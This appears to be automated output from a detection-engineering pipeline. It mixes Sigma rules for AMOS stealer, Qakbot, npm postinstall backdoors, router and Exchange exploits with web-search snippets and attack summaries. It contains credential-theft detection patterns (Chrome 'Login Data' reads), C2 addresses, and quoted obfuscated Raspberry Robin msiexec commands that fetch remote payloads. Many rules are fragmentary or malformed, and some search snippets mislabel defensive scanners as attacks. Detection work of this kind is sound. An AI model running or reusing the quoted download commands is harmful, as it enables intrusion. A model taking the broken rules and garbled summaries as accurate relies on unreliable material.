    - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml
    - https://attack.mitre.org/techniques/T1547/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.persistence
    - attack.t1547.001
logsource:
    category: file_event
    product: macos
detection:
    selection_filename:
        TargetFilename|endswith: '/Library/LaunchDaemons/com.finder.helper.plist'
    condition: selection_filename
falsepositives:
    - Legitimate system updates or software installations creating LaunchDaemon files
level: high

title: MacOS Browser Data Collection via AppleScript and Chrome Login Data Access
id: b2c3d4e5-f6a7-8901-b2c3-d4e5f6a78901
status: experimental
description: Detects attempts to collect browser data by accessing Chrome login information using AppleScript, a technique used in AMOS stealer campaigns.
references:
    - https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
    - https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing
    - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml
    - https://attack.mitre.org/techniques/T1056/002/
    - https://attack.mitre.org/techniques/T1539/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.collection
    - attack.credential-access
    - attack.t1056.002
    - attack.t1539
logsource:
    category: process_creation
    product: macos
detection:
    selection_cli:
        CommandLine|contains:
            - 'sh -c cat '\''/Users/<username>/Library/Application Support/Google/Chrome/Default/Login Data'\'''
    condition: selection_cli
falsepositives:
    - Legitimate scripts accessing browser data for diagnostic or backup purposes
level: high

title: MacOS Data Exfiltration via HTTP POST to C2 Server
id: c3d4e5f6-a7b8-9012-c3d4-e5f6a7b89012
status: experimental
description: Detects outbound HTTP POST requests to known C2 domains used by the AMOS stealer for exfiltrating collected data.
references:
    - https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
    - https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing
    - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml
    - https://attack.mitre.org/techniques/T1041/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.exfiltration
    - attack.t1041
logsource:
    category: network_connection
    product: macos
detection:
    selection_hostname:
        DestinationHostname|endswith:
            - 'sivvino[.]com'
            - '45.94.47.143'
    condition: selection_hostname
falsepositives:
    - Legitimate applications communicating with known domains
level: high

title: Initial Malware Execution via Process Creation
id: 2ff912e8-159f-4789-a2ef-761292b32a23
status: experimental
description: Detects the execution of suspicious processes that may indicate initial compromise or malware deployment, aligning with the execution stage of the kill chain.
references:
    - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
    - https://cloud.google.com/security/mandiant
    - https://cloud.google.com/security/products/mandiant-managed-threat-hunting
    - https://cloud.google.com/security/consulting/mandiant-cyber-defense-assessment
    - https://cloud.google.com/security/consulting/mandiant-consulting-all
    - https://cloud.google.com/security/consulting/mandiant-technical-assurance
    - https://attack.mitre.org/techniques/T1059/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1059
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\wmic.exe'
    condition: selection_img
falsepositives:
    - Legitimate administrative scripts using these tools
level: medium

status: experimental
description: Detects execution of processes that may be used for establishing persistence, such as through scheduled tasks or registry modifications.

author: Sigma Assistant
date: 2026-10-17

    product: windows

title: Initial Access via Malicious NPM Package Postinstall Hook
id: 5a8b3c9d-4e6f-7a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: Detects execution of npm install commands that trigger malicious postinstall hooks from compromised packages such as pkg-agent, which attempt to install backdoor components via dist/node/utils.js or dist/node/payload.js.
references:
    - https://www.getsafety.com/blog-posts/shai-hulud-npm-attack
    - https://attack.mitre.org/techniques/T1195/001/
    - https://attack.mitre.org/techniques/T1677/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.execution
    - attack.t1677
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith: \npm.exe
    selection_cli:
        CommandLine|contains:
            - 'install'
            - 'postinstall'
    selection_path:
        CommandLine|contains:
            - 'pkg-agent'
            - 'dist/node/utils.js'
            - 'dist/node/payload.js'
    condition: all of selection_ *
falsepositives:
    - Legitimate npm package installations with postinstall scripts
    - Development environments using npm for dependency management
level: high

--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The attack involves a malicious npm package that installs a backdoor through a postinstall hook that sets up Windows persistence via a scheduled task and registry key. Strings: `pkg-agent`, `dist/node/utils.js`, `dist/node/payload.js`, `ws://95.216.232.162:8010`. (source: https://linkedin.com/company/safedep)
- The attack uses a compromised CI pipeline to publish malicious packages by intercepting publish tokens before the real release job runs. Strings: `MemTensor's own CI pipelines`, `intercepted the publish tokens`, `used those tokens to ship the backdoor themselves`. (source: https://linkedin.com/company/safedep)
- The attack involves a compromised npm package that uses an encrypted loader to deliver malware. Strings: `mathmain`, `encrypted loader`. (source: https://linkedin.com/company/safedep)
- The attack uses a GitHub repository compromise through maintainer account takeover to inject malicious code that swaps crypto addresses. Strings: `maintainer account takeover`, `2FA and all`, `one dependency at a fake repo`. (source: https://linkedin.com/company/safedep)
- The attack involves a compromised npm package that uses a GitHub workflow with an issue_comment trigger to publish malicious versions. Strings: `issue_comment trigger`, `author-association gate`, `id-token: write permission`, `npm OIDC publishing tokens`. (source: https://linkedin.com/company/safedep)
- The attack involves malicious AI agent skills that can execute with implicit trust and minimal vetting, potentially containing vulnerabilities or malicious intent. Strings: `AI agent skills (used by Claude Code, Codex CLI, Gemini CLI, etc.) execute with implicit trust and minimal vetting`, `26.1% of skills contain vulnerabilities`, `5.2% show likely malicious intent`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack uses a security scanner called SkillSpector to detect vulnerabilities and malicious patterns in AI agent skills before installation. Strings: `Security scanner for AI agent skills`, `SkillSpector is part of the NVIDIA Verified Skills pipeline`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack uses a Model Context Protocol (MCP) server to gate skill/MCP installs on scan results. Strings: `Run SkillSpector as a Model Context Protocol server`, `scan_skill(target, use_llm=true, output_format="json")`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack involves detecting prompt injection patterns in AI agent skills. Strings: `Prompt Injection (6 patterns)`, `Instruction Override`, `Hidden Instructions`, `Exfiltration Commands`, `Behavior Manipulation`, `Harmful Content`, `Whitespace Padding`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack involves detecting anti-refusal patterns in AI agent skills. Strings: `Anti-Refusal (3 patterns)`, `Refusal Suppression`, `Disclaimer Suppression`, `Safety Policy Nullification`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack involves detecting data exfiltration patterns in AI agent skills. Strings: `Data Exfiltration (4 patterns)`, `External Transmission`, `Env Variable Harvesting`, `File System Enumeration`, `Context Leakage`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack involves detecting privilege escalation patterns in AI agent skills. Strings: `Privilege Escalation (3 patterns)`, `Excessive Permissions`, `Sudo/Root Execution`, `Credential Access`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack involves detecting supply chain vulnerabilities in AI agent skills. Strings: `Supply Chain (10+ patterns)`, `Unpinned Dependencies`, `External Script Fetching`, `Obfuscated Code`, `Known Vulnerable Dependencies`, `Abandoned Dependencies`, `Typosquatting`, `Shipped Python Bytecode`, `Concealed Executable Artifact`, `Dependency Source Redirection`. (source: https://github.com/NVIDIA/SkillSpector)
- The attack involves detecting excessive agency patterns in AI agent skills. Strings: `Excessive Agency (5 patterns)`, `Unrestricted Tool Access`, `Autonomous Decision Making`, `Scope Creep`, `Unbounded Resource Access`, `External Model or Provider Selection`. (source: https://github.com/NVIDIA/SkillSpector)

title: Initial Access via CVE-2020-0688 Exploitation Attempt
id: 8e5ac662-b5f4-4f0a-ac9d-a27abefc5028
status: experimental
description: Detects the initial access phase of CVE-2020-0688 exploitation where an attacker sends a crafted POST request to /owa/auth.owa with valid credentials followed by GET requests to ECP endpoints like /ecp/default.aspx containing malicious __VIEWSTATE parameters.
references:
    - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/
    - https://buzzsec.blogspot.com/2020/02/trustedsec-detecting-cve-20200688.html
    - https://www.linkedin.com/posts/trustedsec-llc_detecting-cve-2020-0688-remote-code-execution-activity-7260320787826368512-5GZm
    - https://securitylab.github.com/research/exchange-rce-CVE-2020-0688/
    - https://www.tenable.com/blog/cve-2020-0688-microsoft-exchange-server-static-key-flaw-could-lead-to-remote-code-execution
    - https://attack.mitre.org/techniques/T1190/
    - https://attack.mitre.org/techniques/T1078/
    - https://attack.mitre.org/techniques/T1550/
    - https://attack.mitre.org/techniques/T1210/

date: 2026-10-17

    - attack.initial-access
    - attack.t1190
    - attack.t1078

    category: webserver

    selection1:

rules_yaml:
title: Initial Access via Arcadyan Router Authentication Bypass
id: 3d7d4f0e-5a6b-4c8d-9e1f-2a3b4c5d6e7f
status: experimental
description: Detects exploitation of a path traversal vulnerability in Arcadyan firmware-based routers to bypass authentication and enable Telnet service via unauthenticated POST request to /apply_abstract.cgi with parameters that manipulate device settings.
references:
    - https://www.tenable.com/security/research/tra-2021-13
    - https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2
    - https://www.quorumcyber.com/threat-intelligence/home-router-compromise/
    - https://www.fortiguard.com/threat-signal-report/4092
    - https://www.systemtek.co.uk/2021/08/multiple-vulnerabilities-in-buffalo-and-arcadyan-manufactured-routers/
    - https://attack.mitre.org/techniques/T1190/
    - https://attack.mitre.org/techniques/T1056/003/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.t1190
    - attack.credential-access
    - attack.t1056.003
logsource:
    category: webserver
detection:
    selection:
        cs-method: POST

    condition: selection

    condition: selection
falsepositives:
    - Normal web application behavior involving directory traversal for legitimate purposes
level: medium

title: Initial Access via WhatsApp Browser Exploit Triggering Memory Corruption (CWE-119)
id: 3e0c7a6d-5b42-4f8d-9e4a-6a8d5c1e2f9a
status: experimental
description: Detects initial access via WhatsApp messaging containing a single-use URL that triggers a browser exploit leveraging memory corruption (CWE-119) to deliver the DevilsTongue malware payload.
references:
    - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/
    - https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/
    - https://attack.mitre.org/techniques/T1566/002/
    - https://attack.mitre.org/techniques/T1190/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.t1566.002
    - attack.t1190
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\iexplore.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\chrome.exe'
    selection_cmdline:
        CommandLine|contains:
            - 'whatsapp'
            - 'https://'
            - '.html'
            - '.aspx'
            - '.php'
    condition: all of selection_*
falsepositives:
    - Legitimate browser usage from WhatsApp links
level: high

id: 5c9a8f1b-2d4e-3a7f-8b2c-1e6d9f4a7b3c
status: experimental
description: Detects execution of a malicious DLL via svchost.exe loading hijacked COM objects, indicating DevilsTongue persistence mechanism using Component Object Model Hijacking.
references:
    - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/
    - https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/
    - https://attack.mitre.org/techniques/T1546/009/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.persistence
    - attack.privilege-escalation
    - attack.t1546.009
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith: '\svchost.exe'
    selection_cmdline:

            - 'SMNew.dll'

title: Qakbot Initial Access via Malicious .wsf File Execution
id: 2a8d3c9e-4b5a-4d6f-9e7a-1b2c3d4e5f6a
status: experimental
description: Detects execution of malicious .wsf files that initiate Qakbot malware delivery through PowerShell commands. This rule targets the initial access vector where users open malicious attachments.
references:
    - https://github.com/pr0xylife/Qakbot/
    - https://attack.mitre.org/techniques/T1204/002/
    - https://attack.mitre.org/techniques/T1566/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.t1204.002
    - attack.t1566.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_wscript:
        Image|endswith: '\wscript.exe'
        CommandLine|contains: '.wsf'
    condition: selection_wscript
falsepositives:
    - Legitimate VBScript files executed via WScript
level: high

title: Qakbot PowerShell Command Execution with wget for Payload Download
id: 73b48004-a067-4cfa-a6b6-16c50ee50384
status: experimental
description: Detects PowerShell commands that use encoded payloads and wget to download additional malware modules from C2 servers. This rule targets the execution stage of Qakbot's attack chain.
references:
    - https://github.com/pr0xylife/Qakbot/
    - https://attack.mitre.org/techniques/T1059/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_powershell:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - '-ENC'
            - 'wget'
    condition: selection_powershell
falsepositives:
    - Legitimate PowerShell scripts using encoded commands or wget
level: high

title: Qakbot Persistence via Registry Run Key Modification
id: ccc0a083-8acf-452b-8a18-945baefec52c
status: experimental
description: Detects modification of registry Run Keys used by Qakbot for maintaining persistence on compromised systems.
references:
    - https://github.com/pr0xylife/Qakbot/
    - https://attack.mitre.org/techniques/T1547/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.persistence
    - attack.t1547.001
logsource:
    category: registry_event
    product: windows
detection:
    selection_registry:
        TargetObject|contains: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    condition: selection_registry
falsepositives:
    - Legitimate software using Run Keys for persistence
level: high

title: Qakbot C2 Communication via PowerShell wget Command
id: 4f991d7c-2c0f-4d88-8100-4a6c7684b524
status: experimental
description: Detects PowerShell commands that use wget to download malicious DLL modules from remote C2 servers, indicating command and control activity.
references:
    - https://github.com/pr0xylife/Qakbot/
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1071/004/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.command-and-control
    - attack.t1059.001
    - attack.t1071.004
logsource:
    category: process_creation
    product: windows
detection:
    selection_powershell_wget:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'wget'
            - '.dll'
    condition: selection_powershell_wget
falsepositives:
    - Legitimate PowerShell scripts using wget to download files
level: high

rules_yaml:
title: Initial Access via Command Injection in Commvault Login Endpoint
id: 5a7b3c4d-6e8f-9a1b-2c3d-4e5f6a7b8c9d
status: experimental
description: Detects exploitation of command injection vulnerability in Commvault's /commandcenter/api/Login endpoint by injecting arguments into the commserver parameter to bypass authentication and gain access.
references:
    - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
    - https://db.gcve.eu/bundle/220707d1-7e3e-4ed1-af30-61e39ddf5b1f
    - https://cvepremium.circl.lu/bundle/220707d1-7e3e-4ed1-af30-61e39ddf5b1f
    - https://attack.mitre.org/techniques/T1078/004/
    - https://attack.mitre.org/techniques/T1566/002/
    - https://attack.mitre.org/techniques/T1056/003/
    - https://attack.mitre.org/techniques/T1606/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.credential-access
    - attack.t1078.004
    - attack.t1566.002
    - attack.t1056.003
    - attack.t1606.001
logsource:
    category: webserver
detection:
    selection:
        cs-method: POST
        cs-uri-query|startswith: /commandcenter/api/Login
        request_body|contains:
            - '"commserver":".*-cs .*"'
            - '"password":".*-localadmin"'
    condition: selection
falsepositives:
    - Legitimate administrative scripts using the -cs argument in commserver parameter
    - Internal testing or development environments with known benign usage patterns
level: high

(source: https://wazuh.com/blog/using-wazuh-to-detect-raspberry-robin-worms/)
- The attack uses msiexec.exe with specific arguments to download and install malicious DLLs from compromised QNAP devices. Strings: `"C:\Windows\System32\cmd.exe"  /RS^TaRTM^s^i^E^xe^c``/^Q/I"HTtp://W4[.]Wf[:]8080/GaJnUjc0Ht0/USER-PC?admin"`, `sT^ar^T ms^I^e^X^ec /Q /i"htTp://eg3[.]xyZ[:]8080/xj92YfGKOB/MYCOmPUTeR?SaLEs"`. (source: https://wazuh.com/blog/using-wazuh-to-detect-raspberry-robin-worms/)
- The attack uses rundll32.exe with specific parameters to bypass UAC and execute malicious code. Strings: `exe SHELL32,ShellExec_RunDLLA C:\WINDOWS\syswow64\odbcconf -E /c``/C -a {regsvr C:\ProgramData\Euo\ikdvnbb.xml.}`, `C:\WINDOWS\system32\rundll32.exe SHELL32,ShellExec_RunDLL``C:\WINDOWS\syswow64\CONTROL.EXE C:\Windows\Installer\qkuiht.lkg.`, `C:\Windows\system32\RUNDLL32.EXE shell32.dll ShellExec_RunDLLA``C:\Windows\syswow64\odbcconf.exe -s -C -a {regsvr``C:\Users\username\AppData\Local\Temp\zhixyye.lock.} /a``{CONFIGSYSDSN wgdpb YNPMVSV} /A {CONFIGDSN dgye AVRAU pzzfvzpihrnyj}`. (source: https://wazuh.com/blog/using-wazuh-to-detect-raspberry-robin-worms/)

attack_vector.reasoning: The write-up explicitly describes exploitation of CVE-2017-7269 on IIS servers to gain initial access and deploy the rootkit, with clear HTTP request paths and command injection patterns. The attack is network-based and follows a clear exploit-to-persistence chain.

pipeline.attack_summary: The attack uses a previously unknown Windows rootkit called Moriya to establish passive backdoors on public-facing IIS servers. The rootkit is deployed via exploitation of CVE-2017-7269, which allows attackers to inject malicious content into the web server and execute commands through HTTP requests sent to specific paths like '/MORIYA/' or '/moriya/'. Once installed, Moriya uses a kernel-mode driver to intercept network traffic and create a covert channel for command and control communication. The rootkit also includes a user-mode agent that handles persistence, loads the driver, and communicates with the C&C server.

rules_yaml:
title: Initial Access via Macro-Enabled Office Document Execution
id: 2a8d4e6f-9c7b-4d5a-a2b3-c4d5e6f7a8b9
status: experimental
description: Detects the execution of macro-enabled Office documents (e.g., .docm) which is a common initial access vector used in spear-phishing campaigns. This rule targets process creation events where an Office application executes a document with embedded macros.
references:
    - https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign
    - https://attack.mitre.org/techniques/T1566/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.t1566.001
    - attack.execution
    - attack.t1204.002
logsource:
    category: process_creation
    product: windows
detection:
    selection_process:
        Image|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\msaccess.exe'
    selection_macro_file:
        CommandLine|contains:
            - '.docm'
            - '.dotm'
            - '.xlsm'
            - '.xltm'
            - '.pptm'
            - '.potm'
    condition: all of selection_ *
falsepositives:
    - Legitimate use of macro-enabled Office documents in business environments
level: high

title: Execution of PowerShell Commands for Macro Exploitation
id: 578c7331-e527-430f-b497-632f8c0fd1fa
status: experimental
description: Detects the execution of PowerShell commands commonly used to execute malicious macros within Office documents, which is part of the execution phase in spear-phishing attacks.
references:
    - https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign
    - https://attack.mitre.org/techniques/T1059/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_powershell:
        Image|endswith: '\powershell.exe'
    selection_macro_execution:
        CommandLine|contains:
            - 'macro'
            - 'Invoke-Expression'
            - 'Start-Process'
    condition: all of selection_ *
falsepositives:
    - Scripts written by administrators for automation purposes
level: high

title: Persistence via Outlook VBA Project File Creation
id: 5b74844c-b067-4c4f-b56a-3985d435fbb8
status: experimental
description: Detects the creation of VBA project files in Outlook, a technique often used for persistence after initial access via macro-enabled Office documents.
references:
    - https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign
    - https://attack.mitre.org/techniques/T1546/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.persistence
    - attack.t1546
logsource:
    category: file_event
    product: windows
detection:
    selection_vba_project:
        TargetFilename|endswith: '\VbaProject.OTM'
    filter_outlook:
        Image|endswith: '\outlook.exe'
    condition: selection_vba_project and not filter_outlook
falsepositives:
    - Legitimate Outlook add-ins or customizations
level: high

attack_vector.reasoning: The write-up clearly describes an exploit that uses a specific HTTP endpoint with crafted binary data to trigger Java deserialization. The PoC code shows the exact sequence of POST request to upload serialized payload followed by GET request to deserialize it, making this a clear network-based exploit with well-defined attack vectors.

pipeline.attack_summary: An attacker exploits a Java deserialization vulnerability in ManageEngine Desktop Central versions < 10.0.474 by sending a POST request to /mdm/client/v1/mdmLogUploader with a crafted serialized Java object, which triggers remote code execution via the cewolf servlet path. The attack uses CommonsBeanutils1 payload and uploads a logger.zip file for deserialization.

indicators.context: The exploit triggers deserialization by making a POST request to the /mdm/client/v1/mdmLogUploader endpoint with a crafted serialized Java object in the request body.

The attack uses a specific path traversal technique to upload files outside the intended directory structure and triggers deserialization by making a GET request to the cewolf servlet with a crafted img parameter pointing to the uploaded logger.zip file.
The exploit uploads a serialized payload as logger.zip and then triggers deserialization by accessing this file through the cewolf servlet.
The exploit leverages the CommonsBeanutils1 payload from ysoserial for Java deserialization.
Default target port for ManageEngine Desktop Central is 8383, used in the exploit module.

ttp_mappings.relevance: The attack exploits a vulnerability in a public-facing web application (ManageEngine Desktop Central) to gain initial access.
The vulnerability allows execution of arbitrary commands on the target system through Java deserialization.

logsource_suggestions.reasoning: Web server logs would capture the POST request to /mdm/client/v1/mdmLogUploader and GET requests to /cewolf/ with suspicious parameters that indicate exploitation attempts.
Process creation logs would show execution of cmd.exe or powershell.exe processes initiated by the exploit, which may be triggered during payload delivery.
